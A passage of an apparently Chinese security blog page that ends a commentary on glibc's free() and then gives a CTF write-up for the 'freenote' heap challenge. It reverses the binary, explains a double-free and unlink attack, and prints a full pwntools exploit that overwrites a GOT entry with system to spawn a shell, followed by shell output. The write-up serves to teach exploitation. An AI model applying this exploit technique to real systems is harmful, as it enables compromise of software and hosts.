bin</span></span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">	malloc_printerr (<span class="string">"free(): corrupted unsorted chunks"</span>);</span><br><span class="line">      p-&gt;fd = fwd;</span><br><span class="line">      p-&gt;bk = bck;</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">	&#123;</span><br><span class="line">	  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">      bck-&gt;fd = p;</span><br><span class="line">      fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      set_foot(p, size);</span><br><span class="line"></span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">      consolidate into top</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="comment">//合并到topchunk</span></span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don't know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don't want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">	malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">	<span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">	    (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">	  systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">	   large, because the corresponding heap might go away.  */</span></span><br><span class="line">	heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">	assert(heap-&gt;ar_ptr == av);</span><br><span class="line">	heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!have_lock)</span><br><span class="line">      __libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If the chunk was allocated via mmap, release via munmap().</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    munmap_chunk (p);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>这部分就是两个最重要的unlink发生的地方了.分别是向前合并和后向合并,分别检测prev inuse或者next next prev_inuse两处unlink,注意全是向低地址合并,然后插入到unsorted bin中</li>
<li>否则next位top则归入topchunk.</li>
</ul>
<h2 id="io部分"><a href="#io部分" class="headerlink" title="io部分"></a>io部分</h2><ul>
<li>挖坑待填</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/29/malloc源码精读总结/" data-id="cjyn83qg3003hicthocar3p1x" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-level6" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/29/level6/" class="article-date">
  <time datetime="2019-07-28T17:11:01.707Z" itemprop="datePublished">2019-07-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/PWN/">PWN</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/29/level6/">0ctf - freenote</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="整理结构体"><a href="#整理结构体" class="headerlink" title="整理结构体"></a>整理结构体</h1><ul>
<li>程序首先初始化了了chunklist,此题的chunklist是在堆里面分配的</li>
<li>一个指针指向了malloc(0x1810)的头,此段空间的前16字节分别是最大堆块的值和当前堆块数量</li>
<li>大概结构体如下图</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span> headptr         struc ; (<span class="keyword">sizeof</span>=<span class="number">0x1810</span>, align=<span class="number">0x8</span>, mappedto_6)</span><br><span class="line"><span class="number">00000000</span> max             dq ?</span><br><span class="line"><span class="number">00000008</span> count           dq ?</span><br><span class="line"><span class="number">00000010</span> nodelist        note <span class="number">256</span> dup(?)</span><br><span class="line"><span class="number">00001810</span> headptr         ends</span><br><span class="line"><span class="number">00001810</span></span><br></pre></td></tr></table></figure>

<ul>
<li>note结构体如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> note            struc ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, align=<span class="number">0x8</span>, mappedto_7)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: headptr/r</span><br><span class="line"><span class="number">00000000</span> inuse           dq ?</span><br><span class="line"><span class="number">00000008</span> size            dq ?</span><br><span class="line"><span class="number">00000010</span> data            dq ?</span><br><span class="line"><span class="number">00000018</span> note            ends</span><br><span class="line"><span class="number">00000018</span></span><br></pre></td></tr></table></figure>

<ul>
<li>经过整理以后,可以看出来程序一开始初始化了256个note结构体,指针置空</li>
</ul>
<h1 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h1><h2 id="new函数"><a href="#new函数" class="headerlink" title="new函数"></a>new函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">new</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// ST18_8</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( head-&gt;count &lt; head-&gt;max )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = head-&gt;max;</span><br><span class="line">      <span class="keyword">if</span> ( i &gt;= head-&gt;max )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !head-&gt;nodelist[i].inuse )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Length of new note: "</span>);</span><br><span class="line">        size = retint();</span><br><span class="line">        <span class="keyword">if</span> ( size &gt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( size &gt; <span class="number">4096</span> )</span><br><span class="line">            size = <span class="number">4096</span>;</span><br><span class="line">          buf = <span class="built_in">malloc</span>((<span class="number">128</span> - size % <span class="number">128</span>) size);</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Enter your note: "</span>);</span><br><span class="line">          mread1(buf, size);</span><br><span class="line">          head-&gt;nodelist[i].inuse = <span class="number">1L</span>L;</span><br><span class="line">          head-&gt;nodelist[i].size = size;</span><br><span class="line">          head-&gt;nodelist[i].data = buf;</span><br><span class="line">          ++head-&gt;count;</span><br><span class="line">          LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"Done."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"Invalid length!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> v0;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"Unable to create new note."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>整理过结构体以后,程序逻辑就很清晰了,new函数是从前到后遍历chunklist,当inuse为0的时候,在那个堆块malloc了note的空间,注意的是,size是不可任意malloc的,因为设置了自动对齐的运算,size大小只能是128*n (n &gt; 0)</li>
<li>这就导致了我们无法直接申请fastbin</li>
<li>还有程序自己实现了read函数,输入size后必须输入满足你的size才能结束输入循环</li>
</ul>
<h2 id="list函数"><a href="#list函数" class="headerlink" title="list函数"></a>list函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">list</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( head-&gt;count &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"You need to create some new notes first."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = head-&gt;max;</span><br><span class="line">      <span class="keyword">if</span> ( i &gt;= head-&gt;max )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( head-&gt;nodelist[i].inuse == <span class="number">1</span> )</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d. %s\n"</span>, i, head-&gt;nodelist[i].data);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>打印当前所有inuse为1的堆块</li>
</ul>
<h2 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  headptr *v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Note number: "</span>);</span><br><span class="line">  v3 = retint();</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> || v3 &gt;= head-&gt;max || head-&gt;nodelist[v3].inuse != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Invalid number!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Length of note: "</span>);</span><br><span class="line">  v2 = retint();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Invalid length!"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">4096</span> )</span><br><span class="line">    v2 = <span class="number">4096</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v2 != head-&gt;nodelist[v3].size )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = head;</span><br><span class="line">    v1-&gt;nodelist[v3].data = <span class="built_in">realloc</span>(head-&gt;nodelist[v3].data, (<span class="number">128</span> - v2 % <span class="number">128</span>) v2);<span class="comment">// 0 128 256</span></span><br><span class="line">    head-&gt;nodelist[v3].size = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter your note: "</span>);</span><br><span class="line">  mread1(head-&gt;nodelist[v3].data, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>这个edit函数并没有限制编辑的次数,而且要注意的是,当size不一样的时候,程序会调用realloc函数</li>
</ul>
<h2 id="del函数"><a href="#del函数" class="headerlink" title="del函数"></a>del函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( head-&gt;count &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"No notes yet."</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Note number: "</span>);</span><br><span class="line">  v1 = retint();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= head-&gt;max )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Invalid number!"</span>);</span><br><span class="line">  --head-&gt;count;</span><br><span class="line">  head-&gt;nodelist[v1].inuse = <span class="number">0L</span>L;               <span class="comment">// 未check是否inuse 任意次数free</span></span><br><span class="line">  head-&gt;nodelist[v1].size = <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">free</span>(head-&gt;nodelist[v1].data);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>最短的函数之一,也是漏洞点的所在</li>
<li>程序并没有check堆块是否inuse,而且free后指针没有置空,所以就导致了我们可以通过double free来进行攻击</li>
</ul>
<h1 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h1><ul>
<li>要进行攻击,必须获得程序中的一些基址,也就是在程序真正运行时的一些偏移,这里可以采用unsorted bin leak来leaklibc的基址,同样我们利用free后再次malloc,也可以获得上次相同的堆块,随后我们可以利用形成的双链表的fd bk来获取libc和heap的基址</li>
<li>由于程序中并没有溢出的存在,又不能生成fastbin,这里考虑从堆块错位下手,然后利用未置空的指针来进行double free</li>
<li>具体过程是先leak堆和libc的基址,然后全部free后,malloc4块空间依次free,随后申请一个大的堆块,正好包含起来所有的小堆块,构造unlink后随后free之前修改过的指针的已free堆块,控制指针,随后getshell</li>
</ul>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><ul>
<li>首先add四个堆块,然后依次free index为0和2的堆块,0处就会出现main_arena的真实地址,我们获得了libc基址,2处因为无法合并就会出现双向链表,同样泄露了heap的地址</li>
<li>全部free后,利用堆块错位和double free构造unlink</li>
<li>三次malloc(128)以后内存依次free后内存中应该是下面的样子</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-----+--------------------</span><br><span class="line">0x00 | head   size</span><br><span class="line">0x10 | data   data</span><br><span class="line">.... | data   data</span><br><span class="line">0x80 | data   data</span><br><span class="line">-----+--------------------</span><br><span class="line">0x90 | head   size</span><br><span class="line">0xa0 | data   data</span><br><span class="line">.... | data   data</span><br><span class="line">0x110| data   data</span><br><span class="line">-----+--------------------</span><br><span class="line">0x120| head   size</span><br><span class="line">0x130| data   data</span><br><span class="line">.... | data   data</span><br><span class="line">0x1a0| data   data</span><br><span class="line">--------------------------</span><br></pre></td></tr></table></figure>

<ul>
<li>之后编辑堆块构造unlink</li>
<li>放出完整exp</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9886</span>)</span><br><span class="line"><span class="comment"># r = process("./freenote_x64",env=&#123;'LD_PRELOAD':'./libc-2.19.so'&#125;)</span></span><br><span class="line">got_atoi = <span class="number">0x602070</span></span><br><span class="line">libc_mainarena = <span class="number">0x3BE760</span></span><br><span class="line">libc_system = <span class="number">0x46590</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"choice: "</span>,<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(text)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"choice: "</span>,<span class="string">"2"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"new note: "</span>,str(len(text)))</span><br><span class="line">    r.sendafter(<span class="string">"your note: "</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,text)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"choice: "</span>,<span class="string">"3"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"Note number: "</span>,str(index))</span><br><span class="line">    r.sendlineafter(<span class="string">"Length of note: "</span>,str(len(text)))</span><br><span class="line">    r.sendafter(<span class="string">"your note: "</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"choice: "</span>,<span class="string">"4"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"Note number: "</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"start"</span></span><br><span class="line">    new(<span class="string">"1"</span>)</span><br><span class="line">    new(<span class="string">"2"</span>)</span><br><span class="line">    new(<span class="string">"3"</span>)</span><br><span class="line">    new(<span class="string">"4"</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    new(<span class="string">"aaaaaaaa"</span>)</span><br><span class="line">    new(<span class="string">"aaaaaaaa"</span>)</span><br><span class="line">    show()</span><br><span class="line">    r.recv(<span class="number">11</span>)</span><br><span class="line">    s = r.recv(<span class="number">4</span>)</span><br><span class="line">    heap_base = u64(s+<span class="string">'\x00'</span>*<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"heap_base : 0x%x"</span>%heap_base</span><br><span class="line">    r.recv(<span class="number">17</span>)</span><br><span class="line">    s = r.recv(<span class="number">6</span>)</span><br><span class="line">    main_arena = u64(s+<span class="string">'\x00'</span>*<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"mainarena : 0x%x"</span>%main_arena</span><br><span class="line">    chunklist0 = heap_base - <span class="number">0x1910</span></span><br><span class="line">    <span class="comment">#del</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#unlink</span></span><br><span class="line">    new(<span class="string">"1"</span>)</span><br><span class="line">    new(<span class="string">"2"</span>)</span><br><span class="line">    new(<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    payload = <span class="string">""</span></span><br><span class="line">    payload += <span class="string">"a"</span>*<span class="number">8</span> + p64(<span class="number">0x81</span>)</span><br><span class="line">    payload += p64(chunklist0<span class="number">-0x18</span>) + p64(chunklist0<span class="number">-0x10</span>)</span><br><span class="line">    payload += p64(<span class="number">0x0</span>) * <span class="number">2</span> * <span class="number">6</span></span><br><span class="line">    payload += p64(<span class="number">0x80</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">    payload += p64(<span class="number">0x0</span>) * <span class="number">2</span> * <span class="number">8</span></span><br><span class="line">    payload += <span class="string">"a"</span>*<span class="number">8</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">    new(payload)</span><br><span class="line">    free(<span class="number">1</span>)   <span class="comment">#unlink  ptr[0] -&gt; &amp;ptr[0] - 0x18</span></span><br><span class="line">    <span class="comment">#attack</span></span><br><span class="line">    libc_base = main_arena - <span class="number">88</span> - libc_mainarena</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"libc_base : 0x%x"</span>%libc_base</span><br><span class="line">    system = libc_base + libc_system</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"sytem_add : 0x%x"</span>%system</span><br><span class="line">    <span class="comment">#getshell</span></span><br><span class="line">    payload1 = p64(<span class="number">0x1</span>) + p64(<span class="number">0x1</span>)</span><br><span class="line">    payload1 += p64(<span class="number">0x120</span>) + p64(chunklist0<span class="number">-0x18</span>)</span><br><span class="line">    payload1 += p64(<span class="number">0x1</span>) + p64(<span class="number">8</span>) + p64(got_atoi)</span><br><span class="line">    payload1 += p64(<span class="number">0</span>)*<span class="number">2</span> * <span class="number">14</span> + p64(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">print</span> hex(len(payload1))</span><br><span class="line">    edit(<span class="number">0</span>,payload1)</span><br><span class="line">    edit(<span class="number">1</span>,p64(system))</span><br><span class="line">    r.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Your choice: $ ls<br>$ ls<br>flag<br>freenote_x64<br>$ cat flag<br>CTF{de7effd8864<strong><strong>**</strong></strong>c}</p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/29/level6/" data-id="cjyn83qfm0035icth1h2iwwh1" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/3/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/5/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
